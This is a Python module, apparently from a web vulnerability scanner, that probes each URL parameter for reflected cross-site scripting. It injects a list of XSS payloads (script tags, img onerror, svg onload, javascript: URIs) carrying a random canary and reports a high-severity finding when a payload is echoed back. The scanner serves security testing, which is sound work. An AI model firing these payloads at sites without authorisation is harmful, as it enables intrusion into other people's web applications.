import random
from awap.engines.attack.base import AttackModule


class XSSReflectedModule(AttackModule):
    module_id = "xss_reflected"
    vuln_class = "XSS_REFLECTED"

    XSS_PAYLOADS = [
        "<script>alert(1)</script>",
        '"><script>alert(1)</script>',
        "'><script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "javascript:alert(1)",
        "<svg onload=alert(1)>",
        '"><img src=x onerror=alert(1)>',
    ]

    async def run(self, url: str, params: list[dict], context=None) -> list[dict]:
        findings = []
        for param in params:
            for base_payload in self.XSS_PAYLOADS:
                canary = f"XSSCANARY{random.randint(1000, 9999)}"
                payload = base_payload.replace("1", f"'{canary}'")
                try:
                    resp, meta = await self.send_payload(
                        url, "GET", payload, param["name"], param["type"], context
                    )
                    if not resp:
                        continue
                    if payload in resp.text or canary in resp.text:
                        rae = self.analyze_with_rae(context, url, resp, payload)
                        findings.append({
                            "vuln_class": "XSS_REFLECTED",
                            "url": url,
                            "method": "GET",
                            "param": param["name"],
                            "parameter_type": param["type"].upper(),
                            "payload": payload,
                            "evidence": "Payload reflected in response body",
                            "severity": "HIGH",
                            "cvss": 7.2,
                            "confidence": max(0.8, rae.get("confidence", 0)),
                            "confirmed": True,
                            "request_raw": meta.get("request_raw"),
                            "response_raw": meta.get("response_raw"),
                        })
                        break
                except Exception:
                    pass
        return findings
